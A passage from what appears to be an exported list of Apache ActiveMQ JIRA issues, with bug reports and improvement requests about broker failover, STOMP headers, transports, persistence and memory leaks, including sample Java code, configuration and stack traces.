delivery count on the part of the broker.An easy fix which would sometimes prematurely extend the prefetch window would be to always send transacted redelivery acks immediately (or consolidate them separately from receive originated delivery acks).  Since transacted redelivery acks always get triggered on messages delivered later than the receive acks this would cause the broker to think that all the earlier messages had been delivered also.  This might be inappropriate with really large prefetch sizes, although this is tempered by the fact that this only occurs in failover situations.  Another fix might be to enqueue the transacted redelivered messages and do the filtering of these types of messages in the dequeue method which would result in proper ordering of the delivery acks.Anything else would seem to require explicit broker accounting of each delivered message.  I"m willing to try to implement one of these fixes (I"m leaning to the dequeue filtering) but would like some guidance.
issueID:AMQ-3541
type:Improvement
changed files:
texts:TimeStampingBrokerPlugin
This patch adds support for not setting an expiration on messages that have already been expired once before when using the TimeStampingBrokerPlugin.  This helps deal with messages when they are sent to a DLQ, and you don"t want them to expire.
issueID:AMQ-3542
type:Bug
changed files:
texts:Using failover: with static discovery in a network connector to choose from a master/slave tuple leads to hangs and invalid states
static discovery will try to connect to all provided urls. When the list is a master/slave pair with shared storage, only one will active, leading log messages indicating repeated failure to connect.A potential solution is to use failover: just to pick a url but let it delegate failover to the network connector such that the network bridge is correctly stopped/restarted.  static:(failover:(tcp://a:61616,tcp://slave:61616)?maxReconnectAttempts=..)This does not work reliably atm, due to inconsistency in the failover reconnect logic, a network connectors interest in transport interruption/resumption and the lack of thread safety in tracking existing bridges.
issueID:AMQ-3543
type:Bug
changed files:
texts:STOMP connector: unexpected reply-to value for remote temporary topic
The reply-to header on a MESSAGE frame resulting from the sending of a message (SEND) with the reply-to header set to a temporary topic is in the form /temp-topic/<local-temp-topic-name> rather than the expected /remote-temp-topic/<system_generated_name>This only happens when the same connection is used for sending and receiving messages. When a temporary queue is used, the reply-to appears as /remote-temp-queue/xxx as expected. So even if one takes the position that it is reasonable for the local name to be used given that everything is on the same connection, there is an inconsistency between the topic and queue cases. For our purposes we would prefer that the remote form be used always, because we are actually servicing two different users on the same connection (first user does the SEND, second user receives the MESSAGE).Test case for the underlying ActiveMQ bug is attached: StompRemoteTempTopic.javaTo reproduce, drop this file into $ACTIVEMQ_HOME/example/src, edit build.xml in the exampledirectory to add the following:<target name="bug" depends="compile" description="Runs test case for replyTo TempTopic bug"><echo>Running a Stomp example</echo><java classname="StompRemoteTempTopic" fork="yes" maxmemory="100M"><classpath refid="javac.classpath" /><jvmarg value="-server" /></java></target>and run by issuing the command "ant bug". Output is as follows:&#91;echo&#93; Running a Stomp example&#91;java&#93; =====================================================&#91;java&#93; Test run using temporary topic&#91;java&#93; -----------------------------------------------------&#91;java&#93; Sending request message: SEND with reply-to=/temp-topic/2C26441740C0ECC9tt1&#91;java&#93; Received request message: MESSAGE with reply-to=/temp-topic/2C26441740C0ECC9tt1&#91;java&#93; Response MESSAGE received&#91;java&#93; =====================================================&#91;java&#93; Test run using temporary queue&#91;java&#93; -----------------------------------------------------&#91;java&#93; Sending request message: SEND with reply-to=/temp-queue/2C26441740C0ECC9tt1&#91;java&#93; Received request message: MESSAGE with reply-to=/remote-temp-queue/ID:ChrisBarrow-lap-61815-1318539910206-4:6:1&#91;java&#93; Response MESSAGE receivedThis makes it easy to see that for the queue case the reply-to is set to the remote temporary queue but for the topic case the local temporary topic is specified.
issueID:AMQ-3547
type:Bug
changed files:
texts:Calling Connection.close() on interrupted thread generates InterruptedIOException and leaks Connection
Similar to https://issues.apache.org/jira/browse/AMQ-3529call close() method on connection raise JMSException with InterruptedIOException as causeSample program:public static void main(String[] args) throws Exception { ConnectionFactory connectionFactory = new ActiveMQConnectionFactory("tcp://localhost:61616"); Connection connection = connectionFactory.createConnection(); Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE); final Thread mainThread = Thread.currentThread(); new Thread() {  public void run() {   // this thread interrupt main thread after 1s   try {    Thread.sleep(1000);   } catch (InterruptedException e) {   }   mainThread.interrupt();  }; }.start(); try {  //wait for interrupt  Thread.sleep(10000); } catch (InterruptedException e) {  Thread.currentThread().interrupt(); } try {  // this generate exception - bug???  connection.close(); } catch (JMSException e) {  e.printStackTrace(); } // non-daemon thread responsible for connection still running, program // will not terminate}when I remove line with Session obtain, everything works OK
issueID:AMQ-3550
type:Improvement
changed files:
texts:Allow virtual topic interceptor to ignore messages that are received over network connector
In case where we want to replicate both virtual topics and their respectable queues over network of brokers, we need to ignore topic messages on remote broker to avoid duplicates messages in queues.The idea is to introduce new configuration parameter<virtualTopic name=">"  local="true"/>which will make that interceptor handle only locally-produced messages.
issueID:AMQ-3551
type:Improvement
changed files:
texts:exclude networkConnectors from sendFailIfNoSpace on producer flow control
SystemUsage.sendFailIfNoSpace results in an exception. this exception will cause a network bridge to stop and restart, just like an network outage. Handling it does not make sense as the only way to handle it is to stop and start an individual consumer on the bridge, to stop consumption, which is effectivly what blocking the send on the broker would do, the default when sendFailIfNoSpace=false. Coupled with the fix for https://issues.apache.org/jira/browse/AMQ-3331, blocking behavior is the best for a network connector.
issueID:AMQ-3554
type:Improvement
changed files:CreateBrokerCommand.java
texts:activemq:create command should use name as argument in place of option
Karaf ActiveMQ command activemq:create use -n (or --name) to define the name. The name is mandatory, so it makes sense to use it as argument in place of an option.It means that:activemq:create -n testwill becomeactivemq:create testMore other, activemq:create-broker seems to be more consistent.I will submit a patch to enhance/rename all Karaf commands to be consistent.
issueID:AMQ-3556
type:Bug
changed files:
texts:HttpTransport not playing nice with Compression and sending TextMessage
When sending or receiving messages with the HttpTransport and the UseCompression setting enabled on the ActiveMQConnectionFactory all messages are sent and received with Message bodies correctly compressed except for the TextMessage which is not sent with contents compressed (receipt does work).  The problem is that the XStreamWireFormat doesn"t call beforeMarshall in its marshalText method for any MarshalAware commands that are sent (in the case of MessageDispatch it must do this on the inner Message object).
issueID:AMQ-3557
type:Bug
changed files:
texts:Performance of consumption with JDBC persistance and Microsoft SQL Server
We are trying to upgrade our ActiveMQ installation and have run into some performance issues. I"ll attached our activemq.xml file to this bug.I"ve setup a fresh SQLServer database for our upgrade tests and using the example Ant tools in the distribution, I"ve populated a persistent queue with 1,000,000 messages. I then consume those messages using the example Ant consumption script. The producing side works fine. However the performance of the consumption side is extremely poor. To consume just 10,000 of those messages takes over 5 minutes.The consumer will pause for 4-5 seconds every 200 messages. This is easily visible in the output of the Ant script. We have also traced the DB to see what is happening there and have found that the findNextMessagesStatement takes 4-5 seconds every time it is executed. The statement"s ID parameter is increased by 200 every time it is executed.  We also noticed the use of the "SET ROWCOUNT 10000" statement setting the maximum number of rows returned from a query at 10000. We also traced previous versions of ActiveMQ and found that SET ROWCOUNT was used much more often, with much smaller values (often 10, 20 or 30).We have also tested the same setup with version 5.4.0 and did not have the same issues. Consumption speeds with 5.4.0 were normal, with no pauses. Version 5.4.3 did have the problem, however. So there seems to be a regression somewhere between 5.4.0 and 5.4.3 (also affects 5.5.0 and later).Please let me know if you need more information, including the database traces.
issueID:AMQ-3558
type:Improvement
changed files:
texts:Allow the base network consumer priority to be configured on a networkConnector
decreaseNetworkConsumerPriority allows the priority to be decreased based on the number of hops a consumer is from the target. The base priority is always -5. It is not possible to configure one bridge to have lower priority than another and this would be nice in the case of lan/wan traffic. Giving priority to the lan by setting a low priority base for the wan networkConnector.Adding a new networkConnector consumerPriorityBase attribute with default -5 will resolve this. Set it to any value lower than -5 and enable decreaseNetworkConsumerPriority to give all consumers on that network lower priority.
issueID:AMQ-3559
type:Bug
changed files:MessageDatabase.java
texts:KahaDB NPE when loading data from previous versions
When loading a data directory containing KahaDB logs from previous versions a NPE exception can be encountered.  The new Version in 5.6 is v4 however an if statement in the MessageDatabase still checks against a current of v3.  Code needs to be updated to use the VERSION field to ensure its checking against the most current value.
issueID:AMQ-356
type:Improvement
changed files:ActiveMQManagedConnection.java
texts:Manage of ActiveMQConnection
When I tried to create and connect on queue I can see on my log "Not supported."After debugging I see that it comes from "ActiveMQManagedConnection.class" and the method "associateConnection". Indeed this method is not implemented:  /** @see javax.resource.spi.ManagedConnection#associateConnection(java.lang.Object)     */    public void associateConnection(Object connection) throws ResourceException {        throw new ResourceException("Not supported.");    }I propose this code:public void associateConnection(Object connection)        throws ResourceException    {        if(connection instanceof JMSConnectionProxy)        {            JMSConnectionProxy proxy = (JMSConnectionProxy)connection;            proxyConnections.add(proxy);        } else        {            throw new ResourceException("Not supported : associating connection instance of " + connection.getClass().getName());        }    }
issueID:AMQ-3560
type:Bug
changed files:
texts:Destinations do not implement javax.resource.Referenceable and will not be registerable in JNDI by some compliant JCA containers.
According to the JCA spec, AdminObjects are only guaranteed to be bound in JNDI by the JCA provider if javax.resource.Referenceable is implemented.  See 13.4.2.3 "Administered Objects".  A JMS provider is free to provide AdminObjects that implement only javax.naming.Referenceable in an otherwise unmanaged environment, but a resource adapter must allow the application server/jca container to use its own ObjectFactory and call setReference() on the admin objects that need to be looked up.  See 20.6 JNDI Configuration and Lookup.This is a problem for users using an application server such as the current release of AS7 which will not bind AdminObjects otherwise.
issueID:AMQ-3562
type:Bug
changed files:HttpClientTransport.java
texts:HttpTransport can generate an IllegalStateException when KeepAliveResponseRequired = true
When the InactivityMonitor is configured to require keep alive responses the DefaultHttpClient used in the HttpTransport can throw an IllegalStateException, the client should be created with a ThreadSafeClientConnManager instance to avoid this error.
issueID:AMQ-3563
type:Task
changed files:
texts:Update javadoc links to point to JDK 1.6 and JEE 1.5.
The current build uses the sun javadoc links and is a version behind, javase v1.5 and javaee v1.4.
issueID:AMQ-3564
type:New Feature
changed files:
texts:new masterslave: discovery agent for networkConnector to simplify master/slave pair configuration
Create a masterslave configuration that provides an equivalent of the current recommended way to setup a network connection to a master/slave pair more intuitively.Current recommendation:networkConnector uri="static:(failover:(tcp://master,tcp://slave)?randomize=false&maxReconnectAttempts=0)"Proposed new syntax (functionally equivalent)networkConnector uri="masterslave:(tcp://master,tcp://slave)"Thanks to Scott Cranton <scranton fusesource.com> for the inspiration and initial impl.
issueID:AMQ-3566
type:Improvement
changed files:
texts:Enhance HTTP transport to support wire level Compression using GZip
Provide a means of enabling HTTP compression using GZip for data sent and received over the HTTP and HTTPS transports.  The is separate functionality form the Message level compression that can be used to compress only the Message body when configuring ActiveMQConnectionFactory.setUseCompression.  The Http transport level compression would be enabled via a URI option such as:http://localhost:8161?transport.useCompression=true
issueID:AMQ-3567
type:Bug
changed files:
texts:The InactivityMonitor onException call interrupts itself when the readCheckTime was exceeded.
The process that activemq uses to check if there has been inactivity for a connection has a flaw when it tries to close the connection because of inactivity. The current process generates the following interrupt exception.  2011-10-25 12:13:56,878 | DEBUG | org.apache.activemq.util.ServiceSupport - Could not stop service: tcp://localhost/127.0.0.1:61616. Reason: java.lang.InterruptedExceptionjava.lang.InterruptedException    at java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireSharedNanos(AbstractQueuedSynchronizer.java:1302)    at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:253)    at org.apache.activemq.transport.tcp.TcpTransport.doStop(TcpTransport.java:553)    at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:70)    at org.apache.activemq.transport.tcp.TcpTransport.stop(TcpTransport.java:570)    at org.apache.activemq.transport.InactivityMonitor.stop(InactivityMonitor.java:132)    at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65)    at org.apache.activemq.transport.WireFormatNegotiator.stop(WireFormatNegotiator.java:91)    at org.apache.activemq.util.ServiceSupport.dispose(ServiceSupport.java:43)    at org.apache.activemq.transport.failover.FailoverTransport.disposeTransport(FailoverTransport.java:207)    at org.apache.activemq.transport.failover.FailoverTransport.handleTransportFailure(FailoverTransport.java:223)    at org.apache.activemq.transport.failover.FailoverTransport$3.onException(FailoverTransport.java:184)    at org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:101)    at org.apache.activemq.transport.WireFormatNegotiator.onException(WireFormatNegotiator.java:160)    at org.apache.activemq.transport.InactivityMonitor.onException(InactivityMonitor.java:265)    at org.apache.activemq.transport.InactivityMonitor$4.run(InactivityMonitor.java:185)    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)    at java.lang.Thread.run(Thread.java:680) This is caused because the spawned thread in the AbstractInactivityMonitor classes readCheck method calls the onException method. This method will then call the stopMonitorThreads method which subsequently calls the shutdownNow method of the ASYNC_TASKS executor. This call causes the executor to call the interrupt method for all active threads in the executor. The problem is that the calling thread is part of the ASYNC_TASKS executor and therefore it is generating the interrupt exception. Here is the stack trace of the call that is causing the interrupt.  Daemon Thread [InactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@66da9ea4] (Suspended (entry into method interrupt in Thread))       Thread.interrupt() line: 902       ThreadPoolExecutor$Worker.interruptNow() line: 855       ThreadPoolExecutor.shutdownNow() line: 1167       InactivityMonitor.stopMonitorThreads() line: 363       InactivityMonitor.onException(IOException) line: 264       InactivityMonitor$4.run() line: 185       ThreadPoolExecutor$Worker.runTask(Runnable) line: 886       ThreadPoolExecutor$Worker.run() line: 908       Thread.run() line: 680   The solution is to replace the shutdownNow method call with shutdown. Subsequent testing with this change does not cause the interrupt exception. I was able to create a testcase that reproduces this issue. The testcase uses the useInactivityMonitor=false attribute to reproduce this issue, thanks Gary for the hint. Unfortunately there aren"t any steps that I can use to determine that the raised interrupted exception was raised or not. The test will pass either way. A patch will be added to this issue.
issueID:AMQ-3568
type:Bug
changed files:
texts:Consumer auto acking of duplicate message dispatch can lead to Unmatched acknowledge: and redelivery
javax.jms.JMSException: Unmatched acknowledge: MessageAck {commandId = 4208, responseRequired = false, ackType = 2, consumerId = ID:gtmbp.local-35153-1319651042567-3:2:1:1, firstMessageId = ID:gtmbp.local-35153-1319651042567-3:2:1:975:2, lastMessageId = ID:gtmbp.local-35153-1319651042567-3:2:1:1050:2, destination = queue://TestQueue, transactionId = null, messageCount = 151, poisonCause = null}; Expected message count (151) differs from count in dispatched-list (152) at org.apache.activemq.broker.region.PrefetchSubscription.assertAckMatchesDispatched(PrefetchSubscription.java:455) at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:206) at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:427) at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:569) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77) at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:276) at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:87) at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:87) at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:477) at org.apache.activemq.command.MessageAck.visit(MessageAck.java:229) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:318) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:229) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:222)Problem occurs when a duplicate dispatch is one of many inflight messages to a destination. The duplicate detection auto acks with a standard ack in place of an individual ack. The standard ack results in an exception in this case because it does not match the dispatch list of the broker. optimizeAcknowledge on the connection factory seems to make this more probable. The duplicate originates from a failover: recovery/reconnect resend.The end result is pending messages on the queue and redelivery after a restart.In some cases, the need for duplicate detection can be circumvented at source via the kahaDB store producer audit, the default LRU cache size is 64. Increasing this can help.<kahaDB ... maxFailoverProducersToTrack="2048" />
issueID:AMQ-3570
type:Improvement
changed files:
texts:Improve ActiveMQ&#39;s XSD to allow elements to appear in any order
By default, ActiveMQ requires its XML config file to be validated, this is good to catch typos.However, the XSD file being used forces us to have elements in a given order (currently alphabetical see http://activemq.apache.org/xml-reference.html - Schema Validation - Alphabetically Ordered XML Elements (New in 5.4))
issueID:AMQ-3573
type:Improvement
changed files:BrokerService.java
texts:Hardcoded defaults for systemUsage not suitable for out of the box
Right now the default activemq.xml has the entire <systemUsage> section commented out. If commented, then the default systemUsage as defined in BrokerService.getSystemUsage() applies and uses these limits:memoryLimit 64 MBstoreLimit: 10 GBtempLimit: 100 GBI don"t think these are good default values as in the worst case the broker may use 110 GB of disk space. Many runtime environments will not have that much disk space and are therefore in danger of running out of disk space completely. IMHO some more sensitive defaults would be memoryLimit 64 MBstoreLimit:  1 GBtempLimit:   1 GBto prevent the broker from using too much disk space by default. I believe most users of ActiveMQ are unaware of these defaults and probably don"t expect the broker to use up to 110 GB of their disk. If anyone really needs large store and temp limit, they should explicitly configure for it.
issueID:AMQ-3574
type:Improvement
changed files:
texts:Enable <systemUsage> configuration in activemq.xml out of the box.
Right now the <systemUsage> configuration in conf/activemq.xml is commented. If commented then the default systemUsage defined in BrokerService.getSystemUsage() takes effect.I don"t think many users are aware of the default systemUsage settings. I know of some users that thought there are no systemUsage restrictions enforced when this configuration is commented.So rather than commenting out <systemUsage> in our default configuration, why not enabling it with the same settings as the default systemUsage (which anyway takes effect when the <systemUsage> config is commented)?IMHO it will make it more clear to users what limits are currently enforced. We should also leave a comment in the <systemUsage> config that disabling this config makes the broker use the default settings.
issueID:AMQ-3576
type:Bug
changed files:
texts:ProducerBrokerExchange last producer sequenceId initialization needs runtime updates to deal with possible duplicate resends
Under load, a  buffered pending send can be replayed along with a failover replay (writeTimeFilter initiated) which can miss the audit b/c it won"t have knowledge of the original send.The dispatch decision is based on the current stored state at the time of reconnect with the expectation that the next message will not be duplicated. It seems under some load and tcp buffering conditions this is possible to get duplicate sends of new messages.
issueID:AMQ-3579
type:Improvement
changed files:pom.xml
XStreamWireFormat.java
features.xml
HttpTransportServer.java
texts:Allow usage of http transport in OSGi environment
We need to create an appropriate bundle out of activemq-optional module
issueID:AMQ-358
type:New Feature
changed files:LdapNetworkConnector.java
texts:JNDI / LDAP discovery mechanism
It"d be nice to use a clustered JNDI or LDAP server to perform discovery of networks, clusters etc
issueID:AMQ-3580
type:Bug
changed files:
texts:Documentation on integration with spring contains misleading part regarding embedded broker
Hi,There is a misleading part in how to configure activemq with spring if someone"s needs an embedded broker:(section Using an embedded broker).This section references BrokerFactoryBean to use to instantiate broker within spring context. Unfortunately this class is deficient in a way it will terminate a broker immidiately after factory was used and destroyed.
issueID:AMQ-3581
type:Bug
changed files:
texts:Web Console: escape link urls
This should allow management of destinations and durable subscriptions with names containing special chars, like #,%,&,+, etc
issueID:AMQ-3586
type:Bug
changed files:
texts:spaces in queue name
Creating a queue that"s name contains trailing blanks leads to several problems.Try the following within amq web console to reproduce: create a queue with name "123  " (without quotes) create a second queue with name "123 " (without quotes) send a message to one of them--> amq creates a third queue, all three of them seem to have the same name within the browser, at jmx-level you see that there are three (with spaces)--> Number of Pending messages is 1 for the queue I"ve send the message and 0 for the other two--> if you click on the queue name within the amq browser, you see the same message within all three queues--> adding a consumer to one queue adds the same consumer to all of them
issueID:AMQ-3588
type:Bug
changed files:PooledMessageConsumer.java
PooledSession.java
texts:PooledSession - Can cause memory leak in case many consumers is created by the session
See (CAMEL-4657In the activemq-pool we have a memory leak when a PooledSession is used to create many consumers. As each consumer is added to an internal list, which in case the session is closed, the list is used to ensure all previously created consumers gets closed as well.However if the session is used to create many consumers, then that internal list just keep growing, and causing OOME. See attached screenshots of a before vs after with the bug fix.So to remedy this situation, we should ensure any closed consumer gets removed from that internal list. As its already closed, and therefore the session do not need to keep track of it anymore.This bug have existed ever since AMQ-615.The impact of this bug can be seen in CAMEL-4657, which essentially makes using Camel for request/reply over JMS with AMQ and with named replyTo queues (eg not temporary) will cause this problem. The problem manifests due Spring DMLC, which uses a MessageSelector to only pickup expected reply messages. And because the MessageSelector is created once when the consumer is created. We need to create a new Consumer, every time a new message is doing request/reply, to ensure the Message Selector gets updated. So in that situation many consumers get created, which leads to OOME as the list in PooledSession keeps growing.It would be great if this bug fix can be backported to the 5.5 branch as well.
issueID:AMQ-3589
type:Task
changed files:
texts:Remove @Ignore on org.apache.activemq.camel.JmsJdbcXATest
The following was found on activemq-camel source in trunk. I"m opening this ticket in the Camel project because it"s related to a side effect caused by an issue in camel-jdbc.@Ignore("When upgrade to the Camel 2.8.0, this test will be hang due to camel-jdbc autoCommit issue CAMEL-4272."        + "We should remove this Ignore annotation when upgrade Camel version again")See: https://svn.apache.org/repos/asf/activemq/trunk/activemq-camel/src/test/java/org/apache/activemq/camel/JmsJdbcXATest.java.The affecting ticket is resolved now (CAMEL-4272), so I guess this test can run again.
issueID:AMQ-3590
type:Bug
changed files:MessageServletSupport.java
texts:activemq-web REST servlet support for JMSType is broken via typo
As seen here:        String type = (String)asString(parameters.remove("JMSType"));        if (correlationID != null) {            message.setJMSType(type);        }http://svn.apache.org/viewvc/activemq/trunk/activemq-web/src/main/java/org/apache/activemq/web/MessageServletSupport.java?revision=1177445&view=markup#l130there is a copy-paste typo in the MessageServletSupport class. The null-check conditional should check the "type" variable instead of "correlationId".
issueID:AMQ-3596
type:Bug
changed files:
texts:FilePendingMessageCursor memory list does not respect priority for non persistent messages
Priority support for non persistent messages is broken if all messages remain in memory. The first dispatch will in receipt order so the consumers ordering is not sufficient.Problem: the default store cursor uses a file pending cursor for non persistent messages, but the in memory list is not priority aware.Work around: is to use the vmCursor or to disable broker persistence.Fix: is to make use of the PendingList from a vm cursor for the memory list of a file pending message cursor.
issueID:AMQ-3599
type:Bug
changed files:
texts:JaasDualAuthenticationPlugin, java.net.BindException: Address already in use on shutdown with pending connectons
The check for an ssl connection is causing re-init of the transport server in error.Exception from the logs at shutdown:2011-11-15 16:43:18,997 [139:53398-29324] WARN  Service                        - Failed to remove connection ConnectionInfo {}, reason: java.io.IOException: Failed to bind to server socket: stomp://0.0.0.0:6163?transport.closeAsync=false&transport.keepAlive=true&transport.soLinger=0 due to: java.net.BindException: Address already in use2011-11-15 16:43:18,997 [139:53398-29324] DEBUG Service                        - Exception detail:java.io.IOException: Failed to bind to server socket: stomp://0.0.0.0:6163?transport.closeAsync=false&transport.keepAlive=true&transport.soLinger=0 due to: java.net.BindException: Address already in use at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:33) at org.apache.activemq.transport.tcp.TcpTransportServer.bind(TcpTransportServer.java:139) at org.apache.activemq.transport.tcp.TcpTransportFactory.doBind(TcpTransportFactory.java:60) at org.apache.activemq.transport.TransportFactory.bind(TransportFactory.java:131) at org.apache.activemq.broker.TransportConnector.createTransportServer(TransportConnector.java:315) at org.apache.activemq.broker.TransportConnector.getServer(TransportConnector.java:145) at org.apache.activemq.security.JaasDualAuthenticationBroker.removeConnection(JaasDualAuthenticationBroker.java:111) at org.apache.activemq.broker.BrokerFilter.removeConnection(BrokerFilter.java:113) at org.apache.activemq.broker.MutableBrokerFilter.removeConnection(MutableBrokerFilter.java:119) at org.apache.activemq.broker.TransportConnection.processRemoveConnection(TransportConnection.java:757) at org.apache.activemq.broker.TransportConnection.doStop(TransportConnection.java:1036) at org.apache.activemq.broker.jmx.ManagedTransportConnection.doStop(ManagedTransportConnection.java:73) at org.apache.activemq.broker.TransportConnection$3.run(TransportConnection.java:964) at java.lang.Thread.run(Thread.java:662)Caused by: java.net.BindException: Address already in use at java.net.PlainSocketImpl.socketBind(Native Method) at java.net.PlainSocketImpl.bind(PlainSocketImpl.java:383) at java.net.ServerSocket.bind(ServerSocket.java:328) at java.net.ServerSocket.<init>(ServerSocket.java:194) at javax.net.DefaultServerSocketFactory.createServerSocket(ServerSocketFactory.java:170) at org.apache.activemq.transport.tcp.TcpTransportServer.bind(TcpTransportServer.java:135) ... 12 more
issueID:AMQ-3600
type:Bug
changed files:
texts:Failover reconnect bypasses DestinationPathSeparatorBroker generating invalid destinations
impl from https://issues.apache.org/jira/browse/AMQ-3204 - the broker filter needs to intercept processConsumerControl and for good measure messagePullThe processConsumerControl is used on failover recovery and will result in destination creation with out the separator replacement.
issueID:AMQ-3601
type:Bug
changed files:ByteSequence.java
texts:when using http transport xstream cannot construct org.apache.activemq.util.ByteSequence as it does not have a no-args constructor
A no-args constructor should be added to org.apache.activemq.util.ByteSequence
issueID:AMQ-3603
type:Improvement
changed files:
texts:STOMP 1.1 introduced the heartBeat header implemented by the inactivity monitor, would be nice to have this option for stomp 1.0
Stomp 1.0 does not provide for an inactivity monitor. A client connect that stays idle will remain active on the broker indefinitely. With 1.1, the inactivity monitor has come into play in response to the heartBeat header. For 1.0 clients we need a way to indicate that there is a default heartBeat header, so a broker readTimeout and no expectation of a writeTimeout.Providing a transport option for stomp like stomp://0.0.0.0:0?transport.defaultHeartBeat=5000,0 would be nice. In the absence of a heartbeat header, as in the stomp 1.0 case, this default value would cause an InactivityMonitor with readCheck of 500 to be installed on each new broker stomp transport connection.Any client that remains inactive for more than 5 seconds will have their broker connection closed.
issueID:AMQ-3605
type:Bug
changed files:TransportConnection.java
texts:NullPointerException in TransportConnection
I"m running ActiveMQ 5.5.0 and clients using Net::Stomp 0.38_99 and I"m seeing infrequent NullPointerExceptions in TransportConnection:Exception in thread "ActiveMQ Connection Dispatcher: /172.31.201.11:50607" java.lang.NullPointerException        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:327)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)        at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:81)        at org.apache.activemq.transport.stomp.StompSubscription.onMessageDispatch(StompSubscription.java:79)        at org.apache.activemq.transport.stomp.ProtocolConverter.onActiveMQCommand(ProtocolConverter.java:596)        at org.apache.activemq.transport.stomp.StompTransportFilter.oneway(StompTransportFilter.java:58)        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1270)        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:815)        at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:851)        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:104)        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:42)This seems to happen 1-2 times per month or so but the result is dire: new messages aren"t delivered to the affected client (you can see the number of pending messages increasing in the admin web interface) until the client or ActiveMQ is restarted.Relevant code snippet from TransportConnection.java,326         if (context != null) {327             if (context.isDontSendReponse()) {implies that we are dealing with a race condition. I"m not familiar with the ActiveMQ code base but it looks like it grabs a lock (serviceLock) before entering that function, so not sure what"s going on.Since there"s no timestamp associated with the stack trace I"m not completly sure what"s going on on the client side. I"ve tried to reproduce it by writing a small script that uses Net::Stomp in a similar way to my real clients, but no luck so far.No idea if it"s relevant, but my affected clients have been both consuming and producing, and sending/receiving on both topics and queues.
issueID:AMQ-3606
type:Bug
changed files:
texts:Features descriptor should define the namespace
The future Karaf 3.0 version will validate the features XML. The namespace is now require.I"m gonna submit a patch to define it.On the other hand, I think that the features-2.1.xml file is no more required. I will provide another patch to remove it.
issueID:AMQ-3607
type:Bug
changed files:
texts:Setting OptimiseAcknowledge on a queue with a prefetch limit causes normal/fast consumers to miss messages when a slow consumer is blocking
The attached test case tests slow consumer handling with a variety of topic policies and SessionFactory/ConnectionFactory settings. The expectation is that a normal (i.e. fast) consumer will continue to receive messages whilst a slow consumer is blocking.Without a prefetch limit, the expected behaviour is seen with setOptimizeAcknowledge both true and false.If a prefetch limit is set, setOptimizeAcknowledge(true) causes the normal/fast consumer to miss messages whilst the slow consumer is blocking.Would be nice to be able to turn on OptimiseAcknowledge for performance reasons, however it is also necessary to set the prefetch limit in order to trigger SlowConsumerStrategy/MessageEvictionStrategySupport logic.testDefaultSettingsPublisher: Send 0SlowConsumer: Receive 0FastConsumer: Receive 0testDefaultSettings: Publisher Sent: 30 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]testDefaultSettings: Whilst slow consumer blocked:  - SlowConsumer Received: 1 [0]  - FastConsumer Received: 30 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]testDefaultSettings: After slow consumer unblocked:  - SlowConsumer Received: 30 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]  - FastConsumer Received: 30 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]testDefaultSettingsWithOptimiseAcknowledgetestDefaultSettingsWithOptimiseAcknowledge: Publisher Sent: 30 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]testDefaultSettingsWithOptimiseAcknowledge: Whilst slow consumer blocked:  - SlowConsumer Received: 1 [0]  - FastConsumer Received: 30 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]testDefaultSettingsWithOptimiseAcknowledge: After slow consumer unblocked:  - SlowConsumer Received: 30 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 